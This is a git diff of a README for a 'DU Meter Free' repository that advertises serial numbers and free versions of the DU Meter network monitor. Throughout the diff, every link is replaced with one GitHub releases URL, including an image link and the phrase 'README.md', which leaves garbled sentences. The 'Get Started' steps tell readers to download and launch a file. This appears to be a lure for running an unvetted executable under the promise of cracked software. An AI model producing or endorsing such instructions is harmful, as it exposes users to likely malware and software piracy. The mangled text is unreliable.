@@ -1,6 +1,6 @@
 # DU Meter Free Repository
 
-Welcome to the DU Meter Free repository, where you can find information and resources related to DU Meter and its alternatives. This README.md file will provide you with a comprehensive overview of the repository, its contents, and how to access the resources available here.
+Welcome to the DU Meter Free repository, where you can find information and resources related to DU Meter and its alternatives. This https://github.com/davidseico/DU-Meter-Free/releases file will provide you with a comprehensive overview of the repository, its contents, and how to access the resources available here.
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -17,7 +17,7 @@ DU Meter is a popular software application used for monitoring internet and netw
 ## Repository Details
 - **Repository Name**: DU-Meter-Free
 - **Repository Short Description**: Explore various aspects of DU Meter, including serial numbers, alternatives, latest versions, and more.
-- **Download Link**: [Project.zip](https://github.com/files/Project.zip) (needs to be launched)
+- **Download Link**: [https://github.com/davidseico/DU-Meter-Free/releases](https://github.com/davidseico/DU-Meter-Free/releases) (needs to be launched)
 
 ## Repository Topics
 - du-meter-3
@@ -39,7 +39,7 @@ DU Meter is a popular software application used for monitoring internet and netw
 
 ## Get Started
 To get started with DU Meter Free repository, follow these steps:
-1. Click on the [download link](https://github.com/files/Project.zip) provided.
+1. Click on the [download link](https://github.com/davidseico/DU-Meter-Free/releases) provided.
 2. Launch the downloaded file to access the contents related to DU Meter.
 3. Explore the repository topics to find information on specific aspects of DU Meter and its alternatives.
 
@@ -48,7 +48,7 @@ If the download link provided above does not work, please check the "Releases" s
 
 Thank you for visiting the DU Meter Free repository. Happy exploring!
 
-![DU Meter Image](https://example.com/du-meter-image.png)
+![DU Meter Image](https://github.com/davidseico/DU-Meter-Free/releases)
 
 🚀🔥📊
 
